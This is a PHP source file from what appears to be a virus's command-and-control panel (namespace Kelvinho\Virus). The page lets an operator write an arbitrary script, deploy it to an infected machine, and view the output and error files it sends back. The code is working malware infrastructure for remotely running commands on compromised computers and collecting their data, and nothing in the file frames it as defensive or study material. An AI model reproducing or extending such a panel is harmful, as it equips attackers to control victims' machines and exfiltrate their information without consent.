<?php

use Kelvinho\Virus\Attack\AdminTemplates;
use Kelvinho\Virus\Attack\AttackInterface;
use Kelvinho\Virus\Header;
use function Kelvinho\Virus\logAttackStatus;
use function Kelvinho\Virus\logError;

if (!isset($_SESSION["attack_id"])) {
    header("Location: " . DOMAIN);
    Header::redirect();
} else {
    $attack = AttackInterface::get($_SESSION["attack_id"]);
    ?>
    <html lang="en_US">
    <?php echo AdminTemplates::header(); ?>
    <body>
    <?php echo AdminTemplates::body($attack); ?>
    <label for="script">Script</label><textarea id="script" rows="12" cols="80" class="w3-input"
                                          style="resize: vertical;"
        <?php if ($attack->getStatus() != AttackInterface::STATUS_DORMANT) {
            echo "disabled";
        } ?>
    ><?php echo $attack->getScript(); ?></textarea>
    <?php
    switch ($attack->getStatus()) {
        case AttackInterface::STATUS_DORMANT: ?>
            <p>Place the script you want to run above. There will be a file where you can pipe your results to at
                <b>%~pd0data</b>, and that file will be returned. There is another file at <b>%~pd0err</b> that will be
                returned. You can pipe error logs over there.</p>
            <?php break;
        case AttackInterface::STATUS_DEPLOYED: ?>
            <p>If you wish to edit the script, change it to dormant mode below.</p>
            <?php break;
        case AttackInterface::STATUS_EXECUTED:
            break;
        default:
            logError("Attack status of " . $attack->getStatus() . " does not exist");
    }
    ?>
    <p>Warning: Virtually everything that attack packages do can be done through this attack package alone. But the
        whole
        point of those packages is to minimize human error writing these shell scripts.</p>
    <div class="w3-button w3-red" onclick="update()">Update</div>
    <?php
    switch ($attack->getStatus()) {
        case AttackInterface::STATUS_DORMANT: ?>
            <p>This attack is dormant. Click <a onclick="deployAttack()" class="link">here</a> to deploy.</p>
            <?php break;
        case AttackInterface::STATUS_DEPLOYED: ?>
            <p>This attack is deployed. Click <a onclick="cancelAttack()" class="link">here</a> to cancel the attack.
            </p>
            <?php break;
        case AttackInterface::STATUS_EXECUTED: ?>
            <p>This attack is executed. Here are contents of file %~pd0data:</p>
            <pre style = "overflow: auto;"><?php echo htmlspecialchars($attack->getData()); ?></pre>
            <p>And the contents of file %~pd0err:</p>
            <pre style = "overflow: auto;"><?php echo htmlspecialchars($attack->getError()); ?></pre>
            <?php break;
        default:
            logAttackStatus($attack->getStatus());
    }
    ?>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
    <script type="text/javascript" src="https://157239n.com/page/assets/js/main.js"></script>
    <script type="application/javascript">
        function update() {
            $.ajax({
                url: "<?php echo DOMAIN_CONTROLLER . "/updateAttack.php"; ?>",
                type: "POST",
                data: {
                    virus_id: "<?php echo $attack->getVirusId(); ?>",
                    attack_id: "<?php echo $attack->getAttackId(); ?>",
                    name: $("#name").val(),
                    profile: $("#profile").val()
                    <?php if ($attack->getStatus() == AttackInterface::STATUS_DORMANT) { ?>
                    , script: $("#script").val()
                    <?php } ?>
                },
                success: function (response) {
                    console.log(response);
                    window.location = "<?php echo DOMAIN_ATTACK_INFO; ?>"
                }
            });
        }
    </script>
    <?php echo AdminTemplates::script($attack); ?>
    </html>
<?php } ?>